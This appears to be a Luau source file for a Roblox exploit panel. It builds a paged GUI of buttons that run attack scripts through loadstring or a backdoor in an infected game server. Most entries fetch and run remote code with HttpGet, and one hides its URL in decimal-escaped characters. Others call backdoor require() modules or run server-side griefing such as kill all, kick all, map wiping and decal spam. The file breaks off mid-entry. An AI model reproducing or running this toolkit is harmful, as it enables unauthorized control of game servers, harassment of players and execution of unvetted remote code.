	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	table.insert(emptybuttons, button)
	return button
end

local function cleanupmtbuttons()
	for _, button in ipairs(emptybuttons) do
		button:Destroy()
	end
	emptybuttons = {}
end

local function updbuttonvisibility()
	cleanupmtbuttons()
	local buttonsToShow = searchingforbuttons and filteredbuttons or allbuttons
	local startIndex = (currentscriptpg - 1) * buttonsperscriptpg + 1
	local endIndex = math.min(startIndex + buttonsperscriptpg - 1, #buttonsToShow)

	for _, button in ipairs(allbuttons) do
		button.Visible = false
	end

	local occupiedPositions = {}

	for i = startIndex, endIndex do
		if buttonsToShow[i] then
			local pos = buttonsToShow[i].Position
			local gridX = math.floor(pos.X.Offset)
			local gridY = math.floor(pos.Y.Offset)
			occupiedPositions[gridX..","..gridY] = true
			buttonsToShow[i].Visible = true
		end
	end

	for row = 0, 2 do
		for col = 0, 2 do
			local xOffset = col * 117
			local yOffset = row * 65 + 1

			if col == 1 then
				xOffset = col * 116
			end

			if not occupiedPositions[xOffset..","..yOffset] then
				mtbutton(xOffset, yOffset, col)
			end
		end
	end

	uwu["previous page"].Visible = true
	uwu["next page"].Visible = true

	savedscriptpg = currentscriptpg
end

local function positionAllButtons()
	local buttonsToPosition = searchingforbuttons and filteredbuttons or allbuttons

	for i, button in ipairs(buttonsToPosition) do
		local positionInGrid = (i - 1) % buttonsperscriptpg
		local row = math.floor(positionInGrid / 3)
		local column = positionInGrid % 3
		local xOffset = column * 117
		local yOffset = row * 65 + 1

		local buttonWidth = 111
		if column == 1 then
			buttonWidth = 113
			xOffset = column * 116
		end

		button.Size = UDim2.new(0, buttonWidth, 0, 60)
		button.Position = UDim2.new(0, xOffset, 0, yOffset)
	end
end

local function filterbuttons(searchText)
	searchText = string.lower(searchText or "")
	filteredbuttons = {}

	if searchText == "" then
		searchingforbuttons = false
		totalscriptpgs = math.ceil(#allbuttons / buttonsperscriptpg)
		currentscriptpg = math.min(savedscriptpg, totalscriptpgs)

		for i, button in ipairs(allbuttons) do
			local positionInPage = (i - 1) % buttonsperscriptpg
			local row = math.floor(positionInPage / 3)
			local column = positionInPage % 3
			local xOffset = column * 117
			local yOffset = row * 65 + 1

			local buttonWidth = 111
			if column == 1 then
				buttonWidth = 113
				xOffset = column * 116
			end

			button.Size = UDim2.new(0, buttonWidth, 0, 60)
			button.Position = UDim2.new(0, xOffset, 0, yOffset)
		end

		updbuttonvisibility()
		return
	end

	for _, button in ipairs(allbuttons) do
		if string.find(string.lower(button.Text), searchText, 1, true) then
			table.insert(filteredbuttons, button)
		end
	end

	for i, button in ipairs(filteredbuttons) do
		local positionInGrid = i - 1
		local row = math.floor(positionInGrid / 3)
		local column = positionInGrid % 3
		local xOffset = column * 117
		local yOffset = row * 65 + 1

		local buttonWidth = 111
		if column == 1 then
			buttonWidth = 113
			xOffset = column * 116
		end

		button.Size = UDim2.new(0, buttonWidth, 0, 60)
		button.Position = UDim2.new(0, xOffset, 0, yOffset)
	end

	searchingforbuttons = true
	totalscriptpgs = math.ceil(#filteredbuttons / buttonsperscriptpg)
	currentscriptpg = 1

	updbuttonvisibility()
end

uwu["next page"].MouseButton1Click:Connect(function()
	playclicksound()
	local buttonsToUse = searchingforbuttons and filteredbuttons or allbuttons
	currentscriptpg = currentscriptpg + 1
	if currentscriptpg > math.ceil(#buttonsToUse / buttonsperscriptpg) then
		currentscriptpg = 1
	end

	positionAllButtons()
	updbuttonvisibility()
end)

uwu["previous page"].MouseButton1Click:Connect(function()
	playclicksound()
	local buttonsToUse = searchingforbuttons and filteredbuttons or allbuttons
	currentscriptpg = currentscriptpg - 1
	if currentscriptpg < 1 then
		currentscriptpg = math.ceil(#buttonsToUse / buttonsperscriptpg)
	end

	positionAllButtons()
	updbuttonvisibility()
end)

uwu["script search bar"].FocusLost:Connect(function()
	filterbuttons(uwu["script search bar"].Text)
end)

uwu["script search bar"]:GetPropertyChangedSignal("Text"):Connect(function()
	filterbuttons(uwu["script search bar"].Text)
end)

function showScriptPage()
	uwu["button holder"].Visible = true
	uwu["script search bar"].Visible = true

	uwu["next page"].Visible = true
	uwu["previous page"].Visible = true

	positionAllButtons()
	updbuttonvisibility()
end

function hideScriptPage()
	uwu["button holder"].Visible = false
	uwu["script search bar"].Visible = false
	uwu["next page"].Visible = false
	uwu["previous page"].Visible = false
end

function cscript(buttonText, onClick, buttonNumber, uniqueId)
	local index = #allbuttons + 1
	local positionInPage = (index - 1) % buttonsperscriptpg
	local row = math.floor(positionInPage / 3)
	local column = positionInPage % 3
	local xOffset = column * 117
	local yOffset = row * 65

	local buttonWidth = 111
	if column == 1 then
		buttonWidth = 113
		xOffset = column * 116
	end

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, buttonWidth, 0, 60)
	button.Position = UDim2.new(0, xOffset, 0, yOffset + 1)
	button.BackgroundColor3 = uwu["default background color"]
	button.BorderColor3 = uwu["default border color"]
	button.BorderSizePixel = 1
	button.TextColor3 = uwu["default border color"]
	button.Font = Enum.Font.RobotoMono
	button.TextSize = 15
	button.TextScaled = false
	button.Text = buttonText
	button.TextXAlignment = Enum.TextXAlignment.Center
	button.TextYAlignment = Enum.TextYAlignment.Center
	button.Parent = uwu["button holder"]
	button.ZIndex = 19
	button.TextWrapped = true
	button.Visible = (index <= buttonsperscriptpg and uwu["button holder"].Visible)

	buttondata[button] = {
		id = uniqueId or buttonText..tostring(index),
		script = onClick,
		number = buttonNumber or index,
		originalPosition = UDim2.new(0, xOffset, 0, yOffset)
	}

	local numberLabel = Instance.new("TextLabel")
	numberLabel.Size = UDim2.new(0, 20, 0, 20)
	numberLabel.Position = UDim2.new(0, -2, 0, -3)
	numberLabel.BackgroundTransparency = 1
	numberLabel.Text = tostring(buttonNumber or index)
	numberLabel.TextColor3 = uwu["default 1/2 color"]
	numberLabel.Font = Enum.Font.RobotoMono
	numberLabel.TextSize = 10
	numberLabel.TextXAlignment = Enum.TextXAlignment.Left
	numberLabel.TextYAlignment = Enum.TextYAlignment.Center
	numberLabel.Parent = button
	numberLabel.ZIndex = 20
	numberLabel.Name = "ButtonNumber"

	local textpadding = Instance.new("UIPadding")
	textpadding.PaddingLeft = UDim.new(0, 6)
	textpadding.PaddingRight = UDim.new(0, 6)
	textpadding.Parent = button

	button.MouseButton1Click:Connect(function()
		playclicksound()
		if buttonNumber == "RQ" and not backdoor then
			unablenotify("you cannot run require scripts without a backdoor.") return
		end
		local data = buttondata[button]
		if not data then return end

		local localPlayer = game.Players.LocalPlayer
		local cleanedCode = data.script:gsub("%%replace%%with%%username%%", localPlayer.Name)

		local formattedCode = ""
		for line in cleanedCode:gmatch("[^\r\n]+") do
			local trimmedLine = line:gsub("^%s", "")
			formattedCode = formattedCode .. trimmedLine .. "\n"
		end

		formattedCode = formattedCode:sub(1, -2)

		local oldexectext = uwu["executor textbox"].Text
		uwu["executor textbox"].Text = formattedCode
		task.spawn(executeCodeFromTextBox)
		uwu["executor textbox"].Text = oldexectext
	end)

	table.insert(allbuttons, button)
	totalscriptpgs = math.ceil(#allbuttons / buttonsperscriptpg)

	button.Visible = (index <= buttonsperscriptpg and uwu["button holder"].Visible)

	return numberLabel
end

function executeCodeFromTextBox()
	if backdoor ~= nil then
		local a,b=string.gsub(uwu["executor textbox"].Text, '%%username%%', game:GetService('Players').LocalPlayer.Name)
		runbackdoor(backdoor, a)
		return
	end
	if backdoored == true then
		return
	end

	local code = uwu["executor textbox"].Text

	if code and code ~= "" then
		assert(loadstring(code))()
	end
end

-------------------------------------------------------------------------------------------------------------------------------

cscript("immortality lord", [[
	require(6534274227)("%replace%with%username%")
]], "RQ")

cscript("comet FE", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
]], "LS")

cscript("DEX explorer", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
]], "LS")

cscript("goner", [[
	require(4513235536).G("%replace%with%username%")
]], "RQ")

cscript("grab knife", [[
	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Grab-knife-v4-24753"))()
]], "LS")

cscript("star glitcher", [[
	require(5738781015).load("%replace%with%username%")
]], "RQ")

cscript("clear map", [[
camera = workspace:FindFirstChild("Camera")
Players = game:GetService("Players")

for _, item in pairs(workspace:GetChildren()) do
	if item ~= camera and item.Name ~= "Terrain" and item.Name ~= "Players" and not Players:GetPlayerFromCharacter(item) then
		item:Destroy()
	end
end

local bro = Instance.new("SpawnLocation", workspace)
bro.Anchored = true
bro.Transparency = 1
bro.Position = Vector3.new(0, 6, 0)

baseplate = Instance.new("Part")
baseplate.Name = "Baseplate"
baseplate.Size = Vector3.new(2048, 16, 2048)
baseplate.Anchored = true
baseplate.Position = Vector3.new(0, 0, 0)
baseplate.BrickColor = BrickColor.new("Dark grey metallic")
baseplate.Material = Enum.Material.Plastic
baseplate.Parent = workspace

txt = Instance.new("Texture")
txt.Texture = "rbxassetid://6372755229"
txt.Parent = baseplate

for _, player in ipairs(Players:GetPlayers()) do
    if player and player.Character then
        player:LoadCharacter()
    end
end
]], "CS / SS")

cscript("infinite yield", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
]], "LS")

cscript("mobile\nkeyboard", [[
	loadstring(game:HttpGet"https://gist.githubusercontent.com/RedZenXYZ/4d80bfd70ee27000660e4bfa7509c667/raw/da903c570249ab3c0c1a74f3467260972c3d87e6/KeyBoard%2520From%2520Ohio%2520Fr%2520Fr")()
]], "LS")

cscript("fe bypass gui", [[
	loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\103\48\48\108\88\112\108\111\105\116\101\114\47\103\48\48\108\88\112\108\111\105\116\101\114\47\109\97\105\110\47\70\101\37\50\48\98\121\112\97\115\115\34\44\32\116\114\117\101\41\41\40\41\10")()
]], "LS")

cscript("c00lgui", [[
	require(14125553864):Fire("%replace%with%username%", "c00lkidd")
]], "RQ")

cscript("quirkyCMD", [[
	loadstring(game:HttpGet("https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw"))()
]], "LS")

cscript("holy wrench", [[
	require(8596757978).load("%replace%with%username%")
]], "RQ")

local interval = 0.2
local brightnessRange = {1, 3}
local colorChangeSpeed = 5

function getRandomColor()
	return Color3.new(math.random(), math.random(), math.random())
end

local isDiscoActive = false

function startDiscoMode()
	while isDiscoActive do
		uwu["lighting"].Ambient = getRandomColor()
		uwu["lighting"].OutdoorAmbient = getRandomColor()
		uwu["lighting"].ColorShift_Top = getRandomColor()
		uwu["lighting"].Brightness = math.random(brightnessRange[1] * 100, brightnessRange[2] * 100) / 100

		t(interval)
	end
end

local originalSettings = {}

function savelighting()
	originalSettings.Brightness = uwu["lighting"].Brightness
	originalSettings.ClockTime = uwu["lighting"].ClockTime
	originalSettings.FogEnd = uwu["lighting"].FogEnd
	originalSettings.GlobalShadows = uwu["lighting"].GlobalShadows
	originalSettings.OutdoorAmbient = uwu["lighting"].OutdoorAmbient
	originalSettings.Ambient = uwu["lighting"].Ambient
	originalSettings.ColorShift_Top = uwu["lighting"].ColorShift_Top
end

function loadlghting()	
	uwu["lighting"].Brightness = originalSettings.Brightness
	uwu["lighting"].ClockTime = originalSettings.ClockTime
	uwu["lighting"].FogEnd = originalSettings.FogEnd
	uwu["lighting"].GlobalShadows = originalSettings.GlobalShadows
	uwu["lighting"].OutdoorAmbient = originalSettings.OutdoorAmbient
	uwu["lighting"].Ambient = originalSettings.Ambient
	uwu["lighting"].ColorShift_Top = originalSettings.ColorShift_Top
end

cscript("disco", [[
	interval = 0.2
	brightnessRange = {1, 3}

	function getRandomColor()
		return Color3.new(math.random(), math.random(), math.random())
	end
	
	while true do
		game:GetService("Lighting").Ambient = getRandomColor()
		game:GetService("Lighting").OutdoorAmbient = getRandomColor()
		game:GetService("Lighting").ColorShift_Top = getRandomColor()
		game:GetService("Lighting").Brightness = math.random(brightnessRange[1] * 100, brightnessRange[2] * 100) / 100

		t(interval)
	end
]], "CS / SS")

cscript("k00pgui", [[
	require(15267263357).V11("%replace%with%username%")
]], "RQ")

cscript("ro-xploit", [[
	loadstring(game:GetObjects('rbxassetid://364364477')[1].Source)()
]], "LS")

cscript("remote spy", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/SimpleSpyV3/main.lua"))()
]], "LS")

cscript("audio logger", [[
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/infyiff/backup/main/audiologger.lua'),true))()
]], "LS")

cscript("unanchor map", [[
	for _, descendant in pairs(workspace:GetDescendants()) do
		if descendant:IsA("BasePart") and descendant.Name ~= "Baseplate" then
			descendant.Anchored = false
		end
	end
]], "CS / SS")

cscript("unable spam", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://82967466186087" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://82967466186087"
				Two.Texture = "rbxassetid://82967466186087"
				Three.Texture = "rbxassetid://82967466186087"
				Four.Texture = "rbxassetid://82967466186087"
				Five.Texture = "rbxassetid://82967466186087"
				Six.Texture = "rbxassetid://82967466186087"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local imageId = "rbxassetid://82967466186087"

	function billbord(part)
		part:FindFirstChildOfClass("BillboardGui"):Destroy()
		if part:FindFirstChildOfClass"BillboardGui"then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addbillbord()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				billbord(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				billbord(newDescendant)
			end
		end)
	end

	--addbillbord()

	local lighting = game:GetService("Lighting")

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    t()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://82967466186087"
sky.SkyboxDn = "rbxassetid://82967466186087"
sky.SkyboxFt = "rbxassetid://82967466186087"
sky.SkyboxLf = "rbxassetid://82967466186087"
sky.SkyboxRt = "rbxassetid://82967466186087"
sky.SkyboxUp = "rbxassetid://82967466186087"

sky.Parent = lighting
]], "CS / SS")

cscript("c00lkidd spam", [[
	function test2(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA"Decal"and v.Texture ~= "rbxassetid://158118263" then
				v.Parent = nil
			elseif v:IsA"BasePart"then
				v.Material = "Plastic"
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "rbxassetid://158118263"
				Two.Texture = "rbxassetid://158118263"
				Three.Texture = "rbxassetid://158118263"
				Four.Texture = "rbxassetid://158118263"
				Five.Texture = "rbxassetid://158118263"
				Six.Texture = "rbxassetid://158118263"
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			test2(v)
		end
	end
	function test3(root)
		for _, v in pairs(root:GetChildren()) do
			test3(v)
		end
	end
	test2(game.Workspace)
	test3(game.Workspace)

	local imageId = "rbxassetid://158118263"

	function billbord(part)
		if part:FindFirstChildOfClass("BillboardGui") then return end

		local billboardGui = Instance.new"BillboardGui"			
		billboardGui.Size = UDim2.new(3, 0, 3, 0)
		billboardGui.AlwaysOnTop = true
		billboardGui.Parent = part
		billboardGui.Adornee = part

		local imageLabel = Instance.new"ImageLabel"			
		imageLabel.Size = UDim2.new(1, 0, 1, 0)
		imageLabel.Image = imageId
		imageLabel.BackgroundTransparency = 1
		imageLabel.Parent = billboardGui
	end

	function addbillbord()
		for _, descendant in pairs(workspace:GetDescendants()) do
			if descendant:IsA"BasePart"then
				billbord(descendant)
			end
		end

		workspace.DescendantAdded:Connect(function(newDescendant)
			if newDescendant:IsA"BasePart"then
				billbord(newDescendant)
			end
		end)
	end

	--addbillbord()

	lighting = game:GetService"Lighting"

local oldSky = lighting:FindFirstChildOfClass("Sky")
if oldSky then
    oldSky:Destroy()
    t()
end

local sky = Instance.new("Sky")
sky.SkyboxBk = "rbxassetid://158118263"
sky.SkyboxDn = "rbxassetid://158118263"
sky.SkyboxFt = "rbxassetid://158118263"
sky.SkyboxLf = "rbxassetid://158118263"
sky.SkyboxRt = "rbxassetid://158118263"
sky.SkyboxUp = "rbxassetid://158118263"

sky.Parent = lighting
]], "CS / SS")

cscript("john doe", [[
	require(2845929020).ooga("%replace%with%username%")
]], "RQ")

cscript("john doe", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/john%20doe.lua"))()
]], "LS")

cscript("saveinstance()", [[
	local Params = {
		RepoURL = "https://raw.githubusercontent.com/luau/SynSaveInstance/main/",
		SSI = "saveinstance",
	}
	local synsaveinstance = loadstring(game:HttpGet(Params.RepoURL .. Params.SSI .. ".luau", true), Params.SSI)()
	local Options = {}
	synsaveinstance(Options)
]], "LS")

cscript("lua hammer", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Icalock/Server/refs/heads/main/Lua%20Hammer.txt", true))()
]], "LS")

cscript("patchma hub", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/patchma%20hub.lua"))()
]], "LS")

cscript("flip tools", [[
	local player = game.Players.LocalPlayer
	local UserInputService = game:GetService("UserInputService")

	local function performfrontflip(character)
		local humanoid = character:WaitForChild("Humanoid")
		local rootPart = character:WaitForChild("HumanoidRootPart")

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		humanoid.Sit = true

		local lookVector = rootPart.CFrame.LookVector
		local spinDirection = Vector3.new(-lookVector.Z, 0, lookVector.X)
		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		if torso then
			local bodyVelocity = Instance.new("BodyAngularVelocity", torso)
			bodyVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.AngularVelocity = spinDirection * -10
			bodyVelocity.P = 1000

			t(0.4)
			bodyVelocity:Destroy()
		end

		t(0.2)
		humanoid.Sit = false
	end

	local function performbackflip(character)
		local humanoid = character:WaitForChild("Humanoid")
		local rootPart = character:WaitForChild("HumanoidRootPart")

		humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
		humanoid.Sit = true

		local lookVector = rootPart.CFrame.LookVector
		local spinDirection = Vector3.new(-lookVector.Z, 0, lookVector.X)

		local torso = character:FindFirstChild("UpperTorso") or character:FindFirstChild("Torso")
		if torso then
			local bodyVelocity = Instance.new("BodyAngularVelocity", torso)
			bodyVelocity.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
			bodyVelocity.AngularVelocity = spinDirection * 10
			bodyVelocity.P = 1000

			t(0.4)
			bodyVelocity:Destroy()
		end

		t(0.2)
		humanoid.Sit = false
	end

	local function onToolActivated(tool)
		local character = player.Character
		if character then
			if tool.Name == "frontflip" then
				performfrontflip(character)
			elseif tool.Name == "backflip" then
				performbackflip(character)
			end
		end
	end

	local function connectToolEvents(tool)
		if tool:IsA("Tool") then
			tool.RequiresHandle = false
			tool.Activated:Connect(function()
				onToolActivated(tool)
			end)
		end
	end

	local function giveTools()
		local backpack = player:FindFirstChild("Backpack")
		if not backpack then return end

		if not backpack:FindFirstChild("FrontFlipTool") then
			local frontFlipTool = Instance.new("Tool")
			frontFlipTool.Name = "frontflip"
			frontFlipTool.RequiresHandle = false
			frontFlipTool.Parent = backpack
			connectToolEvents(frontFlipTool)
		end

		if not backpack:FindFirstChild("BackFlipTool") then
			local backFlipTool = Instance.new("Tool")
			backFlipTool.Name = "backflip"
			backFlipTool.RequiresHandle = false
			backFlipTool.Parent = backpack
			connectToolEvents(backFlipTool)
		end
	end

	local function initializeCharacter(character)
		character:WaitForChild("Humanoid")
		character:WaitForChild("HumanoidRootPart")

		giveTools()

		local backpack = player:WaitForChild("Backpack")
		for _, tool in pairs(backpack:GetChildren()) do
			connectToolEvents(tool)
		end

		backpack.ChildAdded:Connect(function(tool)
			connectToolEvents(tool)
		end)
	end

	player.CharacterAdded:Connect(function(character)
		initializeCharacter(character)
	end)

	if player.Character then
		initializeCharacter(player.Character)
	end

	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)
]], "CS / SS")

cscript("fedora admin", [[
	loadstring(game:HttpGet('https://raw.githubusercontent.com/alexx1212/fedoratoomutch/main/toomucth'))()
]], "LS")

cscript("LALOL backdoor scanner", [[
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script'))()
]], "LS")

cscript("f3x btools", [[
	loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
]], "LS")

cscript("overseer blade", [[
loadstring(game:HttpGet('https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/overseer%20blade.lua'))()
]], "LS")

cscript("glitch sounds", [[	
	local duration = 999999
	if game:GetService("SoundService").RespectFilteringEnabled then return end

	local sounds = {}

	for i,v in pairs(game:GetDescendants()) do
		if v:IsA("Sound")  then
			table.insert(sounds,v)
		end
	end

	local con = game.DescendantAdded:Connect(function(v)
		if v:IsA("Sound") then
			table.insert(sounds,v)
		end
	end)
	t(.1)
	local start = math.floor(tick())
	repeat
		for i,v in pairs(sounds) do
			v:Play()
			v.TimePosition = math.random(0,v.TimeLength * 1000)/1000
			t()
		end
	until math.floor(tick()) == start + duration
	con:Disconnect()

	for i,v in pairs(sounds) do
		v:Stop()
	end
]], "CS / SS")

cscript("script hub", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/ScriptHub"))()
]], "LS")

cscript("dank engine", [[
	require(8544809895).G("%replace%with%username%")
]], "RQ")

cscript("dank engine", [[
loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/dank%20engine.lua"))()
]], "LS")

cscript("OPFinality", [[
	loadstring(game:HttpGet('https://rawscripts.net/raw/OpFinality_590'))()
]], "LS")

cscript("hydroxide", [[
local owner = "Upbolt"
local branch = "revision"

local function webImport(file)
    return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
end

webImport("init")
webImport("ui/main")
]], "LS")

cscript("spiderbot", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/spiderbot.lua"))()
]], "LS")

cscript("dual ultima", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/dual%20ultima.lua"))()
]], "LS")

cscript("r6", [[
   require(10869521285).ConvertRig(game:GetService("Players").%replace%with%username%,Enum.HumanoidRigType.R6)
]], "RQ")

cscript("r15", [[
    require(10869521285).ConvertRig(game:GetService("Players").%replace%with%username%,Enum.HumanoidRigType.R15)
]], "RQ")

cscript("skidded ultima", [[
	require(76283695815175).unable("%replace%with%username%")
]], "RQ")

cscript("skidded ultima", [[
	loadstring(game:HttpGet("https://raw.githubusercontent.com/x2-x21-x18-x14-x5-x18/unable-s-stupid-admin-panel-obfuscated/refs/heads/main/assets%20and%20scripts/skidded%20ultima.lua"))()
]], "LS")

cscript("respawn character", [[
	game:GetService("Players"):FindFirstChild("%replace%with%username%"):LoadCharacter()
]], "CS / SS")

cscript("infinite yield alt", [[
	require(14035238433)("%replace%with%username%")
]], "RQ")

cscript("flamethrower", [[
	require(4666114735).load("%replace%with%username%")
]], "RQ")

cscript("team fat gui", [[
	require(14940596979).fat('%replace%with%username%')
]], "RQ")

cscript("insert spawn", [[
	local bro = Instance.new("SpawnLocation",workspace)
	bro.Anchored = true
]], "CS / SS")

cscript("kill all", [[
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v:IsA("Player") then
			v.Character:BreakJoints()
		end
	end
]], "CS / SS")

cscript("kick all", [[
	for i,v in pairs(game:GetService("Players"):GetChildren()) do 
		if v:IsA("Player") then
			v:Kick(">:3c")
		end
	end
]], "CS / SS")

cscript("anti ban", [[
	require(2788315378).load(nil,%replace%with%username%)
]], "RQ")

cscript("char all BSoDed", [[
	for i,v in pairs(game.Players:GetPlayers()) do
		v.CharacterAppearanceId = "7512887467"
		v:LoadCharacter()
	end
]], "CS / SS")

cscript("666", [[
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local function isPlayerPart(part)
	local ancestor = part:FindFirstAncestorOfClass("Model")
	return ancestor and Players:GetPlayerFromCharacter(ancestor) ~= nil
end

local function decoratePart(part)
	if part:FindFirstChild("stuf") then return end

	local bbg = Instance.new('BillboardGui')
	bbg.Name = 'stuf'
	bbg.Adornee = part
	bbg.Size = UDim2.new(2.5, 0, 2.5, 0)
	bbg.StudsOffset = Vector3.new(0, 2, 0)
	bbg.MaxDistance = math.huge
	bbg.AlwaysOnTop = true
	bbg.Parent = part

	local tlb = Instance.new('TextLabel')
	tlb.Text = '666 666 666 666 666 666'
	tlb.Font = 'SourceSansBold'
	tlb.FontSize = 'Size48'
	tlb.TextColor3 = Color3.new(1, 0, 0)
	tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
	tlb.Position = UDim2.new(-0.125, -22, -1.1, 0)
	tlb.BackgroundTransparency = 1
	tlb.Parent = bbg

	part.BrickColor = BrickColor.new('Really black')
	part.TopSurface = Enum.SurfaceType.Smooth
	part.BottomSurface = Enum.SurfaceType.Smooth

	local sel = Instance.new('SelectionBox')
	sel.Adornee = part
	sel.Color = BrickColor.new('Really red')
	sel.Parent = part

	local light = Instance.new('PointLight')
	light.Color = Color3.new(1, 0, 0)
	light.Range = 15
	light.Brightness = 5
	light.Parent = part

	local fire = Instance.new('Fire')
	fire.Size = 19
	fire.Heat = 22
	fire.Parent = part
end

-- Apply to all parts instantly
for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") and not isPlayerPart(obj) then
		pcall(decoratePart, obj)
	end
end
]], "CS / SS")

cscript("444", [[
local Players = game:GetService("Players")

local function isPlayerPart(part)
	local ancestor = part:FindFirstAncestorOfClass("Model")
	return ancestor and Players:GetPlayerFromCharacter(ancestor) ~= nil
end

local function decoratePart(part)
	if part:FindFirstChild("stuf") then return end

	local bbg = Instance.new('BillboardGui')
	bbg.Name = 'stuf'
	bbg.Adornee = part
	bbg.Size = UDim2.new(2.5, 0, 2.5, 0)
	bbg.StudsOffset = Vector3.new(0, 2, 0)
	bbg.MaxDistance = math.huge
	bbg.AlwaysOnTop = true
	bbg.Parent = part

	local tlb = Instance.new('TextLabel')
	tlb.Text = '444 444 444 444 444 444'
	tlb.Font = Enum.Font.SourceSansBold
	tlb.TextSize = 48
	tlb.TextColor3 = Color3.fromHex("4051ED")
	tlb.Size = UDim2.new(1.25, 0, 1.25, 0)
	tlb.Position = UDim2.new(-0.125, -22, -1.1, 0)
	tlb.BackgroundTransparency = 1
	tlb.Parent = bbg

	part.BrickColor = BrickColor.new('Really black')
	part.TopSurface = Enum.SurfaceType.Smooth
	part.BottomSurface = Enum.SurfaceType.Smooth

	local sel = Instance.new('SelectionBox')
	sel.Adornee = part
	sel.Color3 = Color3.fromHex("4051ED")
	sel.Parent = part

	local light = Instance.new('PointLight')
	light.Color = Color3.fromHex("4051ED")
	light.Range = 15
	light.Brightness = 5
	light.Parent = part

	local fire = Instance.new('Fire')
	fire.Size = 19
	fire.Heat = 22
	fire.Color = Color3.fromHex("4051ED")
	fire.SecondaryColor = Color3.fromHex("99a3ff")
	fire.Parent = part
end

-- Apply to all parts instantly
for _, obj in ipairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") and not isPlayerPart(obj) then
		pcall(decoratePart, obj)
	end
end
]], "CS / SS")

cscript("skeleton sky", [[
